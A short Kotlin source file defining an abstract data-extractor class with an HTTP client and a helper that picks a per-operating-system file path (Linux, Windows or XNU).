package net.kerner.entkerner.abstract

import io.ktor.client.*
import net.kerner.entkerner.model.SystemType
import java.io.File
import java.nio.file.Path

abstract class AbstractDataExtractor<T>(
        val ioClient: HttpClient
) {
    abstract val fileDirectories: SystemFileURI
    abstract val name: String
    abstract suspend fun extractData(file: File): T

    /**
     * casts to V but if stuff like bytearrays are returned you can overwrite it
     */
    open suspend fun <V> handleExtractedData(data: T): V {
        return data as V
    }
}

operator fun SystemFileURI.get(system: SystemType): Path {
    this.system = system
    return when(system) {
        SystemType.LINUX -> linux
        SystemType.WINDOWS -> windows
        SystemType.XNU -> xnu
    }
}